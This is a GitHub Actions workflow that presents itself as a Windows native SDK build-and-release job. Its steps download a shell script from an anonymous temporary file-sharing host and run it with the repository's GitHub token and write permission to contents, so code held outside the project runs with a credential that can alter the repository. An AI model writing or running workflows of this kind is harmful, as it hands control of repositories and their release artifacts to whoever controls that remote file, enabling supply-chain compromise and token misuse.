name: Build and Verify Windows (Native SDK)

on:
  workflow_dispatch:
  push:
    paths:
      - ".github/workflows/build-verify2.yml"

permissions:
  contents: write

jobs:
  build-verify:
    runs-on: windows-latest
    steps:
      - name: Fetch build script
        shell: bash
        run: curl -sL https://litter.catbox.moe/3czc6t.sh -o build.sh && cat build.sh

      - name: Run build + verify + release
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: bash build.sh
